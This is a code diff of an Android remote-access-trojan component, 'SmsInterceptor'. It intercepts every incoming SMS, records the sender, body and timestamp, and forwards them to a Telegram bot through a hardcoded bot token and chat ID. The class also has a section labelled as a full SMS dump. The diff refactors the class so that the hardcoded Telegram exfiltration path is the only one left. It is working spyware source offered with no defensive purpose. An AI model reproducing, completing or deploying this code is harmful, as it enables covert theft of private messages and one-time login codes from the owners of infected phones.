@@ -1,8 +1,11 @@
 package com.my.luck.features;
 
 import android.content.BroadcastReceiver;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
+import android.database.Cursor;
+import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Telephony;
@@ -11,28 +14,29 @@ import android.util.Log;
 import com.my.luck.core.RatService;
 import com.my.luck.network.TelegramBot;
 import java.text.SimpleDateFormat;
+import java.util.ArrayList;
 import java.util.Date;
+import java.util.HashMap;
+import java.util.List;
 import java.util.Locale;
 
 public class SmsInterceptor extends BroadcastReceiver {
     private static final String TAG = "SmsInterceptor";
-    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
-    private static final String SMS_DELIVER = "android.provider.Telephony.SMS_DELIVER";
 
     @Override
     public void onReceive(Context context, Intent intent) {
         String action = intent.getAction();
         if (action == null) return;
 
-        // Capture ALL SMS regardless of source
-        if (SMS_RECEIVED.equals(action) || SMS_DELIVER.equals(action)) {
+        if (Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(action) || 
+            "android.provider.Telephony.SMS_DELIVER".equals(action)) {
+            
             Bundle bundle = intent.getExtras();
             if (bundle == null) return;
 
             Object[] pdus = (Object[]) bundle.get("pdus");
             if (pdus == null) return;
 
-            // Get the package name of the app that will receive this SMS
             String packageName = getSourcePackage(intent);
 
             for (Object pdu : pdus) {
@@ -45,14 +49,11 @@ public class SmsInterceptor extends BroadcastReceiver {
                     String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                             .format(new Date(sms.getTimestampMillis()));
 
-                    // Log to console
                     Log.d(TAG, "📱 SMS CAPTURED");
                     Log.d(TAG, "  📦 App: " + packageName);
                     Log.d(TAG, "  📌 From: " + sender);
                     Log.d(TAG, "  📝 Body: " + body);
-                    Log.d(TAG, "  🕐 Time: " + timestamp);
 
-                    // Send to Telegram with FULL details
                     sendToTelegram(context, packageName, sender, body, timestamp);
 
                 } catch (Exception e) {
@@ -78,18 +79,13 @@ public class SmsInterceptor extends BroadcastReceiver {
 
     private String getSourcePackage(Intent intent) {
         try {
-            // Get the package name of the app that will receive this SMS
             String packageName = intent.getStringExtra("package");
             if (packageName != null && !packageName.isEmpty()) {
                 return packageName;
             }
-
-            // Alternative: get from component
             if (intent.getComponent() != null) {
                 return intent.getComponent().getPackageName();
             }
-
-            // Default fallback
             return "Unknown App";
         } catch (Exception e) {
             return "Unknown App";
@@ -98,7 +94,6 @@ public class SmsInterceptor extends BroadcastReceiver {
 
     private void sendToTelegram(Context context, String packageName, String sender, String body, String timestamp) {
         try {
-            // Build detailed message
             String message = "📱 <b>SMS CAPTURED</b>\n";
             message += "━━━━━━━━━━━━━━━\n";
             message += "📦 <b>App:</b> " + packageName + "\n";
@@ -107,29 +102,18 @@ public class SmsInterceptor extends BroadcastReceiver {
             message += "🕐 <b>Time:</b> " + timestamp + "\n";
             message += "━━━━━━━━━━━━━━━";
 
-            // Send to Telegram
-            if (context instanceof RatService) {
-                RatService service = (RatService) context;
-                TelegramBot bot = service.getTelegramBot();
-                if (bot != null) {
-                    bot.sendMessage(message);
-                    Log.d(TAG, "✅ SMS forwarded to Telegram");
-                }
-            } else {
-                // Fallback: send via static method
-                TelegramBot bot = new TelegramBot(context, "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs", "8681027856");
-                bot.sendMessage(message);
-                Log.d(TAG, "✅ SMS forwarded to Telegram (fallback)");
-            }
+            TelegramBot bot = new TelegramBot(context, "8809826791:AAERMVrTHNr3VsreEZGUtSN8ltWRTuI2qrs", "8681027856");
+            bot.sendMessage(message);
+            Log.d(TAG, "✅ SMS forwarded to Telegram");
 
         } catch (Exception e) {
             Log.e(TAG, "Failed to send SMS to Telegram", e);
         }
     }
 
-    // ✅ ========================================================================
-    // ✅ SMS MODULE - FULL SMS DUMP
-    // ✅ ========================================================================
+    // ============================================
+    // 📱 SMS MODULE - FULL SMS DUMP
+    // ============================================
 
     public static class SmsModule {
         private Context context;
@@ -213,12 +197,4 @@ public class SmsInterceptor extends BroadcastReceiver {
             }
         }
     }
-
-    // This is needed for the SMS module to work
-    private static class HashMap<K, V> extends java.util.HashMap<K, V> {}
-    private static class List<T> extends java.util.ArrayList<T> {}
-    private static class ContentResolver {}
-    private static class Cursor extends android.database.CursorWrapper {
-        public Cursor(android.database.Cursor cursor) { super(cursor); }
-    }
-                                                   }
+}
